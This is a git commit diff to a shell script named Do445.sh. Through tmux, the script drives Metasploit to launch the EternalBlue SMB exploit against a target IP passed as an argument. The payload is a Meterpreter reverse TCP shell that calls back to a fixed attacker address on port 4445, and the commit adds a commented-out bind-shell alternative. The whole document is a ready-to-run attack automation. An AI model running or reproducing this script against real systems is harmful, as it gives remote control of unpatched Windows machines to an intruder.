e1241d648c2717f5b6136367bec90a2079dc97ae
hktalent <3135773@qq.com>
2018-10-16 05:56:11 -0600

    fix up

--- payload/Do445.sh
+++ payload/Do445.sh
@@ -2,7 +2,7 @@ tmux new -s msfcsl -d
 tmux send -t "msfcsl" "use  exploit/windows/smb/ms17_010_eternalblue" Enter
 tmux send -t "msfcsl" "set payload windows/meterpreter/reverse_tcp" Enter
 tmux send -t "msfcsl" "set LHOST     192.168.28.30" Enter
+#tmux send -t "msfcsl" "set payload windows/meterpreter/bind_tcp" Enter
 tmux send -t "msfcsl" "set LPORT     4445" Enter
 tmux send -t "msfcsl" "set RHOST     $1" Enter
 tmux send -t "msfcsl" "run -j -z" Enter
-
